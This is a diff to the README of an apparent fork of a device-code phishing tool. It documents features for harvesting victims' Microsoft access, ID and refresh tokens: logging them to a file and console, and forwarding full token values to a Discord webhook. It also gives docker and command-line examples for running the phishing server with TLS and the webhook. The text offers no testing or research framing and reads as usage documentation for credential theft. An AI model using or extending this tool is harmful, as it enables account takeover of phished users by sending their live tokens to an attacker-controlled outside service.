@@ -3,10 +3,15 @@ Original Project: https://github.com/denniskniep/DeviceCodePhishing
 ## Changes Made to Original Code
 
 ### 1. Reduced Logging Noise
-- Removed repetitive token checking messages
-- Added single initial polling message
-- Only shows important status updates and successful token captures
-
+- Clean and minimal logging by default
+- Shows only important events:
+  - Server startup information
+  - Initial polling message
+  - Successful token captures
+- All captured tokens are automatically logged to:
+  - Console output (minimal format)
+  - `tokens/tokens.txt` file (detailed format)
+  - Discord webhook (if configured)
 
 ### 2. TLS Support
 - Added flexible TLS configuration
@@ -21,7 +26,7 @@ Original Project: https://github.com/denniskniep/DeviceCodePhishing
 ```
 
 ### 3. Token Logging
-- All captured tokens are automatically logged to `tokens.txt`
+- All captured tokens are automatically saved to `tokens/tokens.txt`
 - Includes timestamps and token types
 - Format: `time=<timestamp> level=INFO msg="<token_type> for <user_code>: <token>"`
 - Captures three token types:
@@ -29,7 +34,21 @@ Original Project: https://github.com/denniskniep/DeviceCodePhishing
   - ID Token
   - Refresh Token
 
-### 4. Command Line Arguments
+### 4. Discord Integration
+- Real-time token notifications via Discord webhook
+- Sends detailed token information in code blocks
+- Format includes:
+  - Token type
+  - User code
+  - Token length
+  - Full token value
+  - Timestamp
+```bash
+# Example with Discord webhook
+./DeviceCodePhishing server -a 0.0.0.0:443 --discord-webhook "https://discord.com/api/webhooks/your/webhook/url"
+```
+
+### 5. Command Line Arguments
 | Argument | Description | Default |
 |----------|-------------|---------|
 | `-a, --address` | Server listening address | `0.0.0.0:443` |
@@ -39,6 +58,7 @@ Original Project: https://github.com/denniskniep/DeviceCodePhishing
 | `-u, --user-agent` | User-Agent for HeadlessBrowser | Edge on Windows |
 | `-c, --client-id` | ClientId for requesting token | MS Auth Broker |
 | `-t, --tenant` | Tenant for requesting token | `common` |
+| `--discord-webhook` | Discord webhook URL for notifications | `""` |
 
 ## Running the Server
 
@@ -50,14 +70,15 @@ docker build -t device-code-phishing .
 # Run (HTTP)
 docker run -p 8080:8080 device-code-phishing server -a 0.0.0.0:8080 -l login
 
-# Run (HTTPS)
+# Run (HTTPS with Discord webhook)
 docker run -p 443:443 \
   -v /path/to/cert.pem:/app/cert.pem \
   -v /path/to/key.pem:/app/key.pem \
   device-code-phishing \
   server -a 0.0.0.0:443 -l login \
   --cert /app/cert.pem \
-  --key /app/key.pem
+  --key /app/key.pem \
+  --discord-webhook "https://discord.com/api/webhooks/your/webhook/url"
 ```
 
 =====================================
